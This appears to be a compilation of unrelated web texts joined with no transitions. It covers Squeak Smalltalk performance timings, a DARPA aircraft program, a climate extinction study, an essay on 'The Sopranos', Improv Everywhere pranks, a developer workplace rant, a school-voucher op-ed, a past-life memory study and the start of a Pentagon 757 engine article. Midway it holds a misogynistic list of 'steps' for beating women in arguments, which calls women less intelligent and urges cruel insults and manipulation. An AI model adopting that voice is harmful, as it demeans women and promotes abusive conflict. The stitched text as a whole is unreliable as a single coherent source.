The first script I entered into the Workspace ( which is kind of a scratchpad for exploring new ideas ) displayed the numbers from 1 to 200 on to the transcript , which is a kind of logging window .
Here is the code to do that along with a timing method .
If you highlight thecode and select “ print it ” from the menu , it tells you how long it took to run .
Time millisecondsToRun : [ 1 to : 200 do : [ : i | Transcript show : i ; cr ] ]
This was the response : 10335
Ouch ! 10 seconds .
This is by far the worst performance I ’ve ever seen in any language including BBC BASIC on a 2M Hz machine .
I was certain I must be doing something wrong so I asked on the Squeak beginners list .
Unfortunately , it seems that it really is that slow .
No -one has made any effort to tune the performance .
Here is the comment from the Transcripter class :
" Transcripter is a dog - simple scrolling stream with display .
It is intended to operate with no
support from MVC or color in a minimal , or headless version of Squeak .
No attention has been
paid to appearance or performance . "
Okay .
Well that is a pity – it is one of the first parts of the Squeak people will see and I would have thought that it would put a few people off .
Anyway , the “ everything is an image ” is still selling me so I try to see how long it takes to write 10,000 numbers to a file .
| myFile ios |
ios := ReadWriteStream on : ''. Transcript show : ' Populate Buffer : ' , ( Time millisecondsToRun : [ 1 to : 10000 do : [ :i | ios nextPutAll : ( ( i asString ) , String crlf ) ] ] ) asString , ' millseconds ' ; cr. MessageTally spyOn : [ 1 to : 10000 do : [ :i | ios nextPutAll : ( ( i asString ) , String crlf ) ] ] .
Transcript show : ' Position : ' , ( ios position ) asString ; cr. myFile := StandardFileStream fileNamed : 'c:/test.txt '.
Transcript show : ' Output Buffer : ' , ( Time millisecondsToRun : [ my File nextPutAll : ( ios contents ) ] ) asString , ' milliseconds ' ; cr. my File close .
The MessageTally spyOn : is a nice profiler to see where it is spending its time – it is not really part of the initial test .
This produced the following output on the Transcript :
Populate Buffer : 275 millseconds
Position : 58894
Output Buffer : 9 milliseconds
Hmmm … is 275 milliseconds good or bad ?
I wrote a quick perl script and ran it with Cygwin .
use strict ; open ( FH , " > t3.txt " ) || die " Error : Can't write to file " ; for ( my $ i = 0 ; $ i < 10000 ; ++$ i ) { print FH " $irn " ; } close FH ;
It ran in 0.061s – more than 4 times faster than the Squeak .
Well , this is not very good at all .
MzScheme and Chicken Scheme both produced results similar to the Perl .
Asking on the mailing list again , it seems that the integer to string conversion is implemented in Squeak for flexibility whereas [ it is suspected that ] all the other languages use C libraries .
Now , I ’m not the sort of person who is in favour of premature optimisation , but if all the primitives are 4 times slower than Perl for reasons of flexibility that seems like a huge performance hit .
It seems like it is harder to drop into C from Squeak than it would be from other scripting languages and Perl speed is about as slow as I like to go normally anyway .
Maybe further investigation would reveal that the Transcript and integer to string comparisons are unusually slow .
However , I have to balance the time spent investigating new programming languages is time I ’m not spending developing my application .

DARPA is the Defense Advanced Research Projects Agency of the US Military , it was their initiative in 1973 that led to what we call the Internet today .
They announced the VULTURE program last week which is an initiative to develop an airborne platform that is heavier - than - air and can remain aloft for 5 continuous years , this announcement is to potential offerors ( or companies interested in contracting for some of the R&D ) .
This would be an exploratory development program with the overall goal to develop and demonstrate the ability to deliver and maintain an airborne payload on station for an uninterrupted period exceeding 5 years .
Note to you wannabe contractor geeks – the government is not interested in approaches that use either radioactive energy sources or employs any form of buoyant flight for this application .
The VULTURE Air Vehicle Program will research and develop technologies and systems which will enable the Military to deliver and maintain a 1000 lb , 5 kW airborne payload for an uninterrupted period exceeding 5 years with a 99 + % on station probability .
The architectures selected and the specific approaches taken by the Offerors will determine the range of technical areas that are developed , including , but not limited to , environmental energy collection , high specific energy storage , extremely efficient propulsion systems , precision robotic refueling , autonomous materiel transfer , extremely efficient vehicle structural design , and mitigation of environmentally - induced loads .
The real purpose of the project is n’t necessarily to develop a working prototype for the military , but rather , while working towards that goal they must research and develop individual technologies that , while they may lead to a prototype , will definitely lead to more robust aircraft technologies that can be integrated into current or future systems .
It ’s envisioned that this program will , at a minimum , develop and demonstrate advanced reliability technologies for air vehicles .
Global warming will lead to the extinction of one quarter of all species of plants and animals on Earth by 2050 unless greenhouse - gas emissions are drastically reduced , researchers have found in a study of six regions of the Earth .
The study examined the effect of global warming on 1,103 species of plants , mammals , birds , reptiles , frogs and insects in South Africa , Brazil , Europe , Australia , Mexico and Costa Rica .
While some species might be able to adapt to climate change , the researchers used computer simulations that determined that many would die off as a result of global warming .
Greenhouse - gas emissions from cars and factories could make the Earth hotter than it has been in 10 million years , before most existing species evolved , said Chris Thomas , professor of conservation biology at England 's University of Leeds and lead author of the study .
The damage could be comparable to the dinosaurs ' disappearance from the earth 65 million years ago , the researchers said .
" It 's quite possible that large parts of the world will become barren wastelands , or at least their species diversity will probably drop dramatically , " said Alison Cameron , a co-author of the study , which was published in the Jan. 8 issue of the journal Nature .
Species generally evolve fairly slowly , but the climate change on Earth is happening so fast that it 's unlikely many will be able to adapt , Cameron said .
The United Nations said the report is more evidence that the world should adopt the Kyoto protocol , which aims to stop rising temperatures caused by human pollution .
President Bush declined to sign the treaty in 2001 , saying it was " flawed " and " unrealistic " because it did not include some of the biggest pollution offenders such as China and India .
" The industrialized countries are producing far higher ( carbon dioxide ) emissions per capita than other countries , with the U.S. heading the list , " Thomas said in an e-mail .
" Therefore , these countries need to take action most rapidly .
In effect , we are exporting extinction . "
He also said that industrialized countries have a major responsibility for developing technologies that can combat pollution , such as long - term carbon storage .
Global warming is the newest threat to the species of the Earth , the researchers said , on top of the destruction of certain environments such as rain forests .
" The combination of increasing habitat loss and climate change together is particularly worrying , " said co-author Lee Hannah of Conservation International in Washington , D.C .
The species facing the greatest threat include several Amazonian trees ; South Africa 's national flower , the king protea , and its relatives ; the Spanish imperial eagle ; and Boyd 's forest dragon lizard in Australia .
Birds like the Scottish crossbill might survive if they can manage to fly to Iceland .
Thomas said the majority of global leaders agree that something needs to be done , but he worries it will take too long for countries to agree on an approach .
Meanwhile , damage to the environment will persist .
" The problem is that united action often runs up against the parochial conflicting demands of each country in turn , " he said .
" It is an immense risk not to change direction .
If ever the precautionary principle should apply , it should be now . "

In the pilot episode of “ The Sopranos , ” which Home Box Office first aired on January 10 , 1999 , a thickening son of Essex County , New Jersey , reluctantly visits Jennifer Melfi , a psychiatrist , at her office in Montclair .
His name is Anthony Soprano and he has been depressed .
Tony lives in a “ French provincial ” McMansion in North Caldwell with his wife , Carmela , and their children , Meadow and A.J.
He works as a “ waste - management consultant , ” as he all too modestly informs his doctor ; in fact , his interests extend to the docks , “ no show ” construction jobs , paving and joint - fitting unions , an “ executive card game , ” a sports book in Roseville , loan - sharking , coffee - shop and pizza - place protection rackets , truck hijacking , HUD scams , fell - off - the - back - of - a - truck consumer goods , a strip club in Lodi , and extensive holdings in real estate , vinegar peppers , and gabagool .
Tony Soprano , as everyone in north Jersey and beyond has come to know , is the head of the Di Meo crime family .
He has been suffering from panic attacks .
Business is uneven .
His associates and his children lack focus .
His uncle resents his authority .
His wife resents his late - night romps with yet another goomah .
And his mother , the Medea of Bloomfield Avenue , never loved him ( and may yet give the signal to have him whacked ) .
The pressure is really something .
Just recently , he tells Dr. Melfi , he was short of breath , tingly inside —
“ It felt like ginger ale in my skull . ”
He collapsed while grilling pork sausages on the barbecue :
TONY : The morning of the day I got sick , I been thinking .
It ’s good to be in something from the ground floor .
I came in too late for that , I know .
But lately , I ’m getting the feeling that I came in at the end .
The best is over .
DR .
MELFI : Many Americans , I think , feel that way .
TONY : I think about my father .
He never reached the heights like me .
But in a lotta ways he had it better .
He had his people .
They had their standards .
They had pride .
Today , whadda we got ?
And so began
Tony ’s quest for a renewed sense of family , heritage , coherent truths , mental health , and a prime cut of the Esplanade construction projects .
“ The Sopranos , ” the richest achievement in the history of television , comes to an end June 10th , after eighty - six episodes .
It has been with us a long time — longer than the Bush Administration ( and nothing seems more interminable than that ) .
In his first hour onscreen , Tony , played by James Gandolfini , still had a modest shock of hair and a Gleasonesque lightness to his step .
He had not yet achieved the menacing rhino plod that would come with time , anxiety , and fifteen thousand buttered bialys .
We ’d yet to glimpse his rages , and his accent was less mobbed up , almost refined .
He sounded more Summit than Newark .
Nevertheless , to an astonishing degree the characters and the ideas––comic , dramatic , and social––in “ The Sopranos ” were in place from the start .
Even though its creator , David Chase , never had the luxury of a novelist ’s control of length and narrative destiny , he has rarely faltered .
The show evolved in the manner of a sprawling social novel of the nineteenth century , constantly sprouting new plotlines , developing recurring jokes , images , and characters .
Dickens would have seen a kinsman in the creator of “ Paulie Walnuts ” Gualtieri .
Besides , there are fewer dull patches in “ The Sopranos ” than there are in “ The Mystery of Edwin Drood ” – –all due respect .
Like John Updike ’s Rabbit series or Philip Roth ’s novels of the past decade , “ The Sopranos ” teems with the mindless commerce and consumption of modern America .
The drama and the comedy are rooted in the particulars of life as it is lived from the Pulaski Skyway to Bergen Avenue , and yet the larger events of the world are never completely sealed from view .
There are always televisions playing in the background – – the local news in offices and hospital rooms , the “ Hitler channel ” in Tony ’s living room — and so world politics is the undercurrent rumbling beneath the ordinary nights in New Jersey .
History echoes the domestic catastrophes .
As Bobby “ Bacala ” Baccalieri put it with dire resignation , “ Quasimodo predicted all of this . ”
No matter how funny or blatantly cartoonish some of the supporting players are ( Steve Van Zandt ’s Silvio Dante seems less like a human being than an animated Fellini figure ) , the mobsters and their families in “ The Sopranos ” are a recognizable reflection of all of us .
The epic is peopled with every variety of twenty - first - century character imaginable : mobsters , yes , but also shadow communities of smug and equally troubled psychiatrists , disillusioned F.B.I. agents and cops , neurotic priests , immigrant “ caregivers , ” screen - addled teen - agers , earnestly self - indulgent Columbia students .
It is an Essex County of Italians , Irish , blacks , and Jews , but also of new immigrants : Koreans , Russians , Ukrainians , and Arabs .
Other television series have guests , character types who make a purposeful one - night stand and are then replaced with new types in new situations .
In “ The Sopranos , ” characters arrive and take full human shape ; children grow into adults — and sometimes , without explanation , like a Russian mobster fleeing through the snowy woods of the Pine Barrens , they inexplicably disappear and frustrate our TV - shaped need for lessons and resolution .
It does n’t matter that we come to “ like ” Adriana La Cerva .
Chase has no use for our sentiment .
He kills it off with a .38 .
“ The Sopranos , ” like its predecessor , Martin Scorsese ’s “ Goodfellas , ” is about the ruthlessness of petty lying crooks , but the beat - downs , strangulations , and shootings are the least of the violence .
Chase is merciless with his exposure of the ordinary disappointments and tragedies .
He has immersed us for years in an examination of addiction , twelve - step recoveries , teen - age depression , modern pharmacology , suicides , sexual indulgence , family betrayals , financial manipulation , accidents , heart attacks , strokes , death and dying––and always , afterward , the inability to summon a language to equal the emotion .
“ Whaddya gonna do ? ” is the shrugging motif .
A young , healthy thug dies reading a magazine on the toilet .
An S.U.V. flips over on a rain - slick road .
“ Whaddya gonna do ? ”

Best Buy
On April 23 , 2006 , Improv Everywhere invaded a Manhattan Best Buy .
Eighty agents dressed up as Best Buy employees , sporting Best Buy - blue shirts and khaki pants , and positioned themselves randomly about the store .
In addition to the group 's usual hidden cameras , Agent Todd came up with a genius back - up video source :
They 'd use Best Buy 's own demo products .
" All we would have to do is bring in blank tapes and memory cards to insert in their own video and still cameras . "
In addition to the very specific dress code ( down to the belt and black shoes worn by Best Buy employees ) , the e-mail instructions for the mission included , " Do n't shop , but do n't work either .
If a customer comes up to you and asks you a question , be polite and help them if you know the answer .
If anyone asks you if you work there , say no . "

The uniformed agents far outnumbered the actual Best Buy workers .
At one point , an agent overheard a walkie - talkie communication from a security guard saying , " Thomas Crown Affair !
Thomas Crown Affair ! "
When employees , security guards or , eventually , police officers asked what was going on , the agents ' response was always along the lines of , " Oh , I 'm just waiting for my boyfriend .
He 's over there in the TV section . "

The agents did not seek out customers , but they totally looked like they worked there so customers often approached them .
The agents usually did their best to point them in the right direction ( and often failed ) , although the opportunity for improv was sometimes too much to resist .
One agent recalls this exchange :
Customer :
Do you know where I can find a
Agent :
What is that ?
Customer :
It ’s a computer thing .
Agent : What does USB stand for ?
Customer : I do n’t know .
Customer :
Do you know where I can find a USB port ?
Agent :
What is that ?
Customer :
It ’s a computer thing .
Agent : What does USB stand for ?
Customer : I do n’t know .
At that point , an actual employee rushed up to the pair yelling , " She does n't work here ! "
Best Buy employee ( to agent ) :
You ca n’t help her !
Agent :
Oh , believe me , I was n’t helping her .
The 80 employee look - alikes remained in the store for more than an hour .
The store 's managers were , as several agents put it , " freaking out , " and some of the agents were escorted out before the mission was officially over .
But the majority of agents managed to stay in the store until Agent Todd gave the signal to leave .
Best Buy mission accomplished .
Cell Phone Symphony
" " The conductor Photo courtesy Improv Everywhere Photography credit : Agents Nicholson , Rainswept
In a brilliantly choreographed performance in February 2006 , Improv Everywhere created a symphony of cell - phone ringtones in a bookstore called The Strand .
The Strand is a huge place with about 120 cubbies in the bag - check section of the store , where lots of people end up leaving their cell phones while they shop .
Often , one or two of those phones start ringing , and most people in the store do n't even look up from their browsing .
Improv Everywhere decided to find out what would happen if dozens of phones in the bag check started ringing simultaneously .
But not only that -- the phones would be coordinated by ringtone to go off at different times like the movements of a symphony .
Here 's how the mission went down :
To create enough of a ruckus to get people in the store to really pay attention , they 'd need a lot of phones .
One - hundred and twenty agents showed up with their cell phones for this mission , so that meant 60 phones would go to the bag check and 60 would stay outside to call the 60 inside .
The group of agents stood in the freezing cold ( it was 15 degrees F that night ) a few blocks from the store and divided up by phone brand .
Each brand group found a ringtone that was preloaded on all of the phones in the group .
Half of those phones would go inside .
The agents with inside phones programmed their phone to use the appropriate ringtone and gave their number to someone with an outside phone .
The agents with an inside phone headed to The Strand , where they would trickle in and each check a bag containing a phone .
The agents with an outside phone prepared to wait in the cold for 45 minutes .

With all of the phones in place at the bag check , the agent - conductor stood outside with his orchestra and began the symphony .
All 60 agents dialed their corresponding number and , on the conductor 's cue , hit send .
Inside the strand , 60 cell phones started ringing , and people looked over to the bag check , where the amused employees tried to figure out where the noise was originating .

And then it stopped ... but not for long .
The conductor signaled the Samsung group , the Nokia group , the Motorola group , the Treo group , and the LG group in succession , creating a symphony of different " movements . "
Employees and customers inside witnessed the show with various reactions -- some were annoyed , some were confused , but most were enjoying it .
There were two employees at the bag check in the center of the action , and one of them had a huge smile on his face the entire time .
A thesis developed that a single phone was causing all the others to ring , either by defect or by design , and the bag - check employees searched for the " trigger phone " to no avail .
A nearby employee remarked " It 's like a David Lynch movie in here .
It does n't make sense . "

Outside , the conductor was directing the final movement :
For the finale we built until every caller in every group was calling back and calling back and calling back .
This went on for about three minutes straight until , in true conductor style , I brought my arms down in a big flourish and everyone hung up together in a big " final note . "
The sound of dozens of flip phones all smacking shut in unison was quite satisfying .
The symphony lasted a total of 20 minutes , and it ended just in time .
A manager had just begun marking down the bag - check numbers of the ringing phones when suddenly all was silence .
Agent Todd gave the signal , and the inside agents began the process of leaving the scene .
Cell Phone Symphony mission accomplished .
Best Gig Ever
For one the most famous and also controversial missions in the Improv Everywhere play book , some of the group 's core agents had to really study up .
The idea behind the " Best Gig Ever " mission in October 2004 was to give some unknown band with a terrible time slot the greatest gig of its life .
After combing the entertainment papers for an out - of - town band with a bad show time , Agent Todd settled on Ghosts of Pasha , a band from Vermont , playing at the Mercury Lounge on Sunday night at 10:30 .
Under normal circumstances , that show would probably be pretty quiet .
The agents of Improv Everywhere altered the circumstances , to put it mildly .
" " An agent wearing a Ghosts of Pasha shirt he made using the logo from the band 's Web site Photo courtesy Improv Everywhere Photography credit : Agent Todd
First , each of the 35 core agents downloaded the Ghosts of Pasha album and memorized the lyrics to all of the band 's songs .
Next , they decorated themselves with " Ghosts of Pasha " fake tattoos and silk - screened T - shirts .
Finally , the 35 agents showed up at the gig , which turned out to be Ghosts of Pasha 's third public performance ever .
When the band started to play , the audience -- made up of 35 Improv Everywhere agents and three other people -- was actually singing along with the songs and yelling out requests for their Ghosts of Pasha favorites .
Some people had taken their shirts off and were dancing and moshing .
The band members got into it , too , feeding off the energy from the crowd , and gave the performance of their lives .
After the last song , a sweaty , shirtless agent jumped on stage and hugged the lead singer .

According to Ghosts of Pasha , when the gig was over nobody in the band spoke for a long time .
The first words out of anyone 's mouth were , " What the hell just happened ? "
The ride back to Vermont that night was almost silent .
The band found out several days later that its best gig yet had in fact been an Improv Everywhere performance .
T
he Allied Invasion .
The Trojan Horse .
The Divine Plan .
The following strategy puts them all to shame because it defines how to finally defeat the great beast of society : women .
Arguing with girls , like yoga , is a meaningless and inane exercise .
A lot of guys hate doing it , most notably because it never seems like we can win .
But you can win .
Here 's how .
Step 1 . Abandon all logic .
Girls do n't use it , and you certainly should n't allow it to handicap you .
Step 2 .
If you believe strongly in something , do NOT give in to any aspect of it .
Compromise is useless against girls , because they will rationalize that if they can get you to concede to one element , they can get you to quit on the whole fuckin ' Periodic Table .
( Nothing like a little chemistry humor , right ? )
Step 3 .
Do n't be afraid to take cheap shots .
Ever argue with a girl about something and they randomly insult you with something that has no relevance to the argument ?
That 's their way of trying to wear you down and push you off - topic .
Fight fire with fire , I say .
Tell her she has a fat ass , small boobs , an ugly face , disorienting facial hair , unwieldy hips , and is a genuinely awful person .
Step 4 . Cite precedent .
Girls have no concept of historical factors relating to the current situation .
Most girls reading this just went over to dictionary .com to see what “ precedent ” meant .
Step 5 . Interrupt her .
Do n't let her talk .
Girls hate that like they hate other girls .
It 's hilarious , too .
They get all frazzled .
Step 6 .
Do n't take her seriously .
Laugh at every point she deems serious in nature .
Fart , if possible .
Derail her emotional train .
Step 7 .
If the argument escalates , cut off all communication with her .
If a girl can't find you , she can't continue arguing about bullshit .
Change your phone number , relocate , and get a name change if you must .
Step 8 .
Do n't be fooled by “ Let 's stop arguing please . ”
That 's their way of making you let your guard down , so they can swoop in after you 're worn down .
Instead , say something like “ Yeah , all this being right is exhausting for me . ”
Pisses them off .
Just trust me .
Step 9 .
Compare her unfavorably with another girl .
This is especially effective if the comparison is with a girl that they simply abhor .
Tell her something like , “ Lisa is so much more compassionate than you . ”
Girls hate other girls , like a deer hates a shotgun .
And how do you take down a deer ?
Exactly .
Step 10 .
Do n't be intimidated by the water works .
That 's their ultimate contingency , knowing that guys can't deal with a crying girl .
Stay strong , do n't let yourself get emotional , just think of something funny .
Replay scenes from “ Office Space ” in your head if you must .
Step 11 .
Bust out , “ I do n't feel like fighting .
I 've proven my point . ”
Then stop .
Leave the argument .
It pisses them off because a guy 's natural reaction is to resolve , whereas a girl 's is to continue forever and ever until the end of time until they hear that they are right .
If a guy decides that he is right and wo n't budge , their whole concept of male - female relations is shot to shit .
Again , mind games .
Step 12 .
Ask her if she 's on the rag .
Self - explanatory .
Step 13 .
When all else fails , tell her she 's just like her mother .
It 's an ace - in - the - hole and will emotionally cripple her to such a degree she may even forget her whole argument .
Remember , girls are the less intelligent of the genders .
All throughout history men have out - thought , out - invented , and out - created women in every facet of existence .
Is n't it about time we won an argument for once ?
Gentlemen , that time is now .
A secular analysis of news , culture and kitsch .
Following the slide into theocracy and fascism and encouraging signs of resistance .
Today we ’re going to focus on a sentence that will make almost any developer , even a mild - mannered one , want to box up their red Swingline and head to Tahiti for early retirement .
I believe that software developers strive to do the best work they can .
Most programmers will fight tooth and nail , work evenings and weekends , and scale Mt. Everest on their hands to make sure they do n’t let their team down .
I am , of course , speaking of teams that do n’t have morale problems .
While I acknowledge that they exist , they ’re not the focus of this article .
In the context of a high - functioning team , some developers have the innate gift of self - motivation and strive for their best at all times .
For others it ’s the team dynamic that keeps their hands on the keyboard .
As a developer learns to rely on his teammates and trust relationships form , they make it difficult to coast for fear of letting the group down and the thought of being dubbed the weakest link .
This amalgam of competition and camaraderie is what helped companies like Google , Apple and Microsoft dominate their markets and convince their employees to work 90 hours a week and love it .
But getting back to the point : what ’s the one sentence that makes software developers angry ?
You might be thinking it ’s the insidious :
“ This bug is only reproducible on Opera v0.3 for the Commodore 64 , but fix it anyway , ” or the always favorite
“ We do n’t have a design yet , but start building something because our deadline is n’t moving ” .
Nope on both counts .
This sentence I speak of is the lesser known :
“ Build higher quality software in the same amount of time . ”
That ’s it …only ten words , fewer if you overlook some grammar rules .
So why is this sentence so potent ?
On its own merits , the phrase build higher quality software in the same amount of time will not incite your software developers to riot .
But let ’s examine the underlying message .
The Triangle
Quality and speed are two of the three forces in the famous three - sided triangle of quality , speed and cost .
It ’s a fairly well - known business principle that you can choose two of the three sides of this triangle ; anyone who tells you otherwise is trying to sell you something .
As an aside , if you buy what they ’re selling , send me an email ‘ cuz I have some Beanie Babies I ’m looking to get rid of .
There are many definitions of “ quality , ” but in this article I ’m speaking of software that is well - designed and well - written so as to ensure high availability ( high uptime ) and make it easy to maintain and extend .
With that in mind , let ’s look at what happens if you keep cost the same , meaning you do n’t hire more developers , but want to develop higher quality software .
You could ask your developers to work more hours .
This would likely work temporarily , at least , since more time usually translates into increased productivity .
It ’s debatable whether someone performing work as concentration - intensive as programming is able to function well after a solid 8 + hours , but I ’ll give you the benefit of the doubt on this one .
Even so , studies have shown that “ continuing scheduled overtime has a strong negative effect on productivity . ”
So for the short term we can bring out the whip and expect a slight jump in productivity , but assuming we want something that lasts longer than a few months and do n’t want to experience a McDonalds - esque churn rate ( because that would inevitably increase our cost and decrease the quality of our software ) , let ’s throw this option out the window .
Another option would be to hire better people .
This has a decent probability of increasing quality over time , but it ’s not a solution one can implement overnight .
With a team of 20 developers you ’re probably looking at nine to twelve months to clean out less - productive developers and fill it with solid talent , assuming you have a few less - productive members on your team .
However , if your development team is already a group of “ coding machines , ” or if your goal is to implement something immediately then another avenue must be explored , even if you decide to pursue this one for the long - term .
Training and / or mentoring is a variation of this option with similar advantages , but a similar time - horizon .
Another alternative would be to simply make your people work harder .
Hmmm … this is an interesting one .
If you buy what I said at the start of this article , that most developers are already working at or close to their best due to personal or social reasons , then this hypothesis does n’t quite pan out .
How can someone who ’s already working at a high level of productivity all of a sudden work harder ?
Making someone work harder simply by asking them to is …well … hard to understand .
And that ’s why telling someone to build higher quality software in the same amount of time is insulting , because you ’re essentially telling them they ’re not giving it their best effort .
That they ’re screwing off .
And that makes people mad .
How do I know this ?
Because someone said it to me the other day .
Not just me , in fact , our entire development team .
Better Software
A non-technical manager told us that we have to build better software in the same amount of time , and even included the phrase “ No excuses . ”
Needless to say morale has seen a slight decline in the days following as developers express their feelings of defensiveness .
People who ’ve been giving it their best suddenly feel taken for granted and frustrated , especially the ones who ’ve been working extra hours , solving project issues in their spare time , and running performance tests on the weekend .
When you ’re already working hard it ’s difficult to hear someone tell you to work harder .
The talk was prompted by a recent issue where some high - availability systems were down for the better part of a day .
These systems were written over the past 4 + years under perilous death - march schedules , with little QA because we were in a hurry to get them out the door .
When they went down people panicked , and rightfully so , since many of our customers were foaming at the mouth .
As a result management expressed their concern with the situation , indicating that something had to be done as we move forward .
As I was listening I understood “ Make better software ; reduce risk of failure . ”
As most developers would agree , this is a great approach , and one that several members of our team have been advocating for for quite some time .
I became excited at the thought of ensuring we have ample QA and including more safeguards in our code .
But my parade soon ended in a blizzard when I heard “ I do n’t want to hear excuses about how things are going to take longer .
We can get things done fast AND better . ”
And that ’s when I realized I needed to write this article .
But wait , there ’s a little more .
A comparison was made between our software and the software of a large financial organization ( think Wells Fargo or Washington Mutual ) .
If you ’re thinking “ I ca n’t remember the last time one of those guys was down for an extended period of time , ” you ’re right ; they typically are n’t down , and when they are it ’s not for very long .
But an interesting thing I ’ve learned in the past few years is that the software development cycle for these guys is loooooong , to the tune of 2 - 3 times what our timelines run .
In other words , they ’ve decided to take the “ time ” side of their pyramid and make it really big in exchange for a really big “ quality ” side .
And good for them , because they ’ve obviously made a wise choice , as indicated by their availability .
Now that we ’re faced with the same dilemma it ’s time to pay the piper and admit we need to lower our risk while at the same time admitting to ourselves the sacrifice that it will ultimately require : time .
The Moral
There are at least two morals to this story
The first is that you will eventually reap what you sow , so do n’t compromise your design .
Fight tooth and nail and push out timelines if you have to .
This is not going to be easy , so good luck .
Let me know if you discover any secrets because I would love to hear them .
The other is that reducing risk takes time .
At this point I should add that it ’s our responsibility as technical folk to educate those who do n’t know this .
A concept that appears so clear to us may not be apparent to a person outside if the IT department .
We ’re the only people that truly understand the complexity of the systems we build and the ramifications of spending too little time on design or QA .
Reducing risk is a lot like having insurance – if you elect to have it you have to pay for it .
Send this article to a manager or co-worker who ’s tried to convince you otherwise .
The majority 's decision was eviscerated in a dissent by two Republican judges who use adjectives like " nonsensical " to describe the legal reasoning .
The dissenters argue persuasively that nothing in the Constitution forbids the Legislature from setting up other programs beyond the public school system .
The decision has disillusioned Adrian and his grandmother , Ramona Nickson .
" I just do n't even want to think of sending him back to public school , " she said .
Other parents in Florida worry that more programs are in jeopardy , like the scholarships given to thousands of disabled students in private schools .
Or the many charter schools in the state , which may not suit the judges ' personal vision of a " uniform " system .
" It 's difficult to predict what will happen next after a decision as devoid of legal principle as this one , " said Clark Neily of the Institute for Justice , which represented the voucher recipients in the case .
" The judges decided what decision they wanted to reach and worked backward from there . "
Adrian was supported by the Urban League of Miami and other advocacy groups for blacks and Latinos , but not the N.A.A.C.P .
It abandoned him -- and the majority of African - Americans , who favor school vouchers -- and sided with the teachers ' unions .
The group that once battled the segregationists ' fiction of " separate but equal " schools signed on to the legal fiction that there 's something admirably " uniform " about a public school monopoly that keeps students in Adrian 's neighborhood trapped in a segregated , inferior school .
It 's sad to see the N.A.A.C.P. working to keep them there , but it 's not surprising now that the group is virtually an arm of the Democratic Party .
The unions dominating that party have no qualms about sending Adrian back to a segregated school that has just lost its chief incentive to improve .
The party now has a new educational motto : separate but uniform .
Do you sometimes have memories of a mysterious past life ?
Recall odd experiences such as being abducted by aliens ?
Wonder where these memories come from and if , in fact , you were really once whisked off in a flying saucer by ETs ?
Seems the answer may be simpler than you think — or remember .
A new study shows that people with memories of past lives are more likely than others to misremember the source of any given piece of information .
Study author Maarten Peters of Maastricht University in the Netherlands tested patients of " reincarnation therapists , " who use hypnosis to help their patients remember " past lives , " which the clients believe are at the root of their current problems .
Subjects were given a memory test known as the false fame paradigm , in which they were asked to recite a list of unfamiliar names .
The next day , they were shown a list that included those names , new names , and the names of famous people .
The results : subjects who claimed to have memories of previous lives were more likely than those without such recollections to misidentify more of the previously recited names as belonging to famous people .
In other words , people who believe they had previous lives are committing a source - monitoring error , or an error in judgment about the original source of a memory .
( In this case , they are misremembering the source — themselves — of nonfamous names . )
This is important because source - monitoring mistakes are the first in a sequence of events that psychologists believe lead to false memories .
" Once familiarity of an event is achieved , this can relatively easily be converted into a belief that the event did take place , " Peters says .
" A next possible step is that individuals interpret their thoughts and fantasies about the fictitious event as real memories . "
Jim Tucker , a psychiatrist at the University of Virginia Medical Center , points out , however , that people who are seeking reincarnation therapy are more likely to have psychological problems or to be susceptible to hypnosis , either of which could explain the new findings .
" If someone wants to look at the characteristics of people who have purported past - life memories under hypnosis versus those who do n't , " he says , " the way to design the study would be to recruit subjects [ first ] and then hypnotize them . "
An earlier study by Susan Clancy of Harvard University showed that people with memories of being abducted by aliens had similar problems with poor recall .
" I think the most important finding here is that these people are highly motivated to seek and endorse some way to explain why they are suffering from psychological distress , " Clancy notes .
" There are plenty of people out there who think they might have been abducted by aliens — you 'll see , ask 20 of your friends — but they do n't go so far as to create false memories . "
Pentagon & Boeing 757 Engine Investigation
I 've seen pictures of engine wreckage at the Pentagon after 9/11 .
Your site says the engine of a 757 is over 6 feet across but this piece is way smaller than that .
Does it prove that whatever hit the Pentagon was not a 757 and the government is lying about it ?
- question from Leroy Mulligan
Schematic of a simple jet engine
In order to better understand the parts of a jet engine and how this form of propulsion works , let us briefly revisit the different types of jet engines .
The earliest form of jet propulsion was the turbojet .
This type of powerplant employs a series of compressor blades mounted on rotating disks that squeeze incoming air to a higher pressure and temperature .
The compressed air is then mixed with fuel and ignited .
The high temperature air passes through another series of rotating blades called a turbine , which causes this turbine to spin .
The turbine rotors are attached to a central shaft running the length of the engine , so the turbine 's spinning motion causes this shaft to rotate as well .
Also attached to the same central shaft is the compressor section at the front of the engine .
This connection between the turbine and compressor sections causes the compressor stages to continue spinning , bringing in additional air to keep the engine functioning in a repeating cycle .
Once the airflow moves past the turbines , it is exhausted through a nozzle .
The expansion of the high pressure gases against the nozzle walls creates thrust that pushes the engine forward , as well as the vehicle it is attached to .
Another type of jet that is similar to but more efficient than the turbojet is the turbofan .
A turbofan uses the same components described above with the addition of a large fan in front of the compressor section .
This fan is connected to the same central shaft that turns the compressor blades so that the fan also rotates .
As it does so , the fan accelerates a wide column of air to further increase thrust .
Air passing through the center portion of the fan enters the compressor where it moves through the core of the engine just like on a typical turbojet .
Air accelerated through the fan 's outer diameter , however , flows around the engine core without passing through it .
This process can be better understood by studying an animation of airflow through a turbofan .
There are two basic types of turbofans that are differentiated by the relative amount of air that flows through the fan and around the engine core versus the amount of air that flows through the core itself .
A turbofan with a low - bypass ratio means that most of the air flowing through the engine passes through the turbojet core and very little through the outer fan bypass duct .
Such engines are most common on military combat aircraft like fighters .
Today 's commercial airlines , like the 757 , are instead fitted with high - bypass turbofan engines .
A high - bypass turbofan consists of a very large diameter fan and a much smaller - diameter turbojet core within .
Comparison of a low - bypass turbofan with long ducts and a high - bypass turbofan with short ducts
As shown in the above diagram , a turbofan contains many rotating compressor and turbine disks , all of which are smaller than the fan at the front of the engine .
The rotary components within a high - bypass turbofan , in particular , are often only a small fraction of the fan diameter .
Most specifications describing the overall size of an engine will list the fan diameter since this measurement defines the engine 's maximum width .
Our earlier article about the 757 uses this dimension to compare the diameter of the engine nacelle to that of the fuselage .
With that introduction aside , let 's take a closer look at the specific question of debris found at the Pentagon following the attack on 11 September 2001 .
While researching this topic , we came across many websites claiming that it was not American Airlines Flight 77 that was hijacked and purposefully crashed into the Pentagon during the terrorist attack that morning .
The authors of these sites instead believe that any of a variety of military aircraft , cruise missiles , or other weapons were used by the US government to attack the Pentagon , and the stories of terrorist hijackings were simply a cover up for the sinister scheme .
American Airlines Boeing 757-200 with tail number N644AA
According to the accepted story , American Airlines Flight 77 was hijacked by five al Qaeda terrorists as it was traveling from Washington DC to Los Angeles .
